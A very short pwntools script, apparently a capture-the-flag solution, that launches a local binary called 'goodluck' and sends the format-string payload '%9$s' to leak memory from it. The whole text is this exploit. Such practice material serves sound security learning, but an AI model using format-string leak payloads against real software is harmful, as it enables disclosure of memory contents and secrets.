from pwn import *

p = process("./goodluck")

payload = "%9$s"
p.sendline(payload)
p.interactive()
